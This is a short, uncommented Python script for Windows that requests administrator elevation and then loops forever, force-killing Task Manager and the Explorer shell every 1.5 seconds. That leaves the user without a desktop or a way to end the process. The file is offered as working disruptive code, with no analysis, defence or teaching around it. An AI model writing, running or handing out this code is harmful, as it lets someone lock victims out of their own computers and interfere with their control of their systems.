from sys import executable, argv
from time import sleep
from ctypes import windll
from psutil import process_iter
from os import system


if windll.shell32.IsUserAnAdmin():

    while True:
        for p in process_iter():
            if p.name() in ("Taskmgr.exe", "explorer.exe"): 
                system(f"taskkill /f /im {p.name()}")
                sleep(1.5)

else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)